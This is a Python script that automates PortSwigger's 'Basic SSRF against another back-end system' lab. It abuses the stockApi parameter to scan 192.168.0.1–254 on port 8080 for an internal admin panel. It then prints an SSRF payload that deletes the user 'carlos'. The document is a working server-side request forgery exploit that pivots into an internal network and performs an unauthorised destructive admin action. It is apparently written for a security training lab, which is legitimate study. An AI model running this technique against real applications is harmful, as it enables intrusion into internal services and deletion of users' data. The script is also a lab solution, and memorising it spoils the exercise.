import requests
import argparse

parser = argparse.ArgumentParser(description="Automate PortSwigger's 'Basic SSRF against another back-end system' lab.")
parser.add_argument("-u", "--url", help="Your PortSwigger lab URL.")
parser.add_argument("-s", "--session", help="Your session cookie.")
args = parser.parse_args()

cookies = {"Session": args.session}

found_it = ""
for i in range(1,255):
    data = {"stockApi": f"http://192.168.0.{i}:8080/admin/"}
    # delete?username=carlos
    # It's 206

    url = f"{args.url}product/stock/"

    response = requests.post(url, data=data, cookies=cookies)

    print(response.request.method + ' ' + response.request.url)
    print(response.request.body)

    print(f"Trying 192.168.0.{i}...")

    if response.status_code == 200:
        found_it = f"192.168.0.{i}"
        break

print(f"The IP is: {found_it}")
print(f"Send data in stockApi parameter: http://{found_it}:8080/admin/delete?username=carlos")
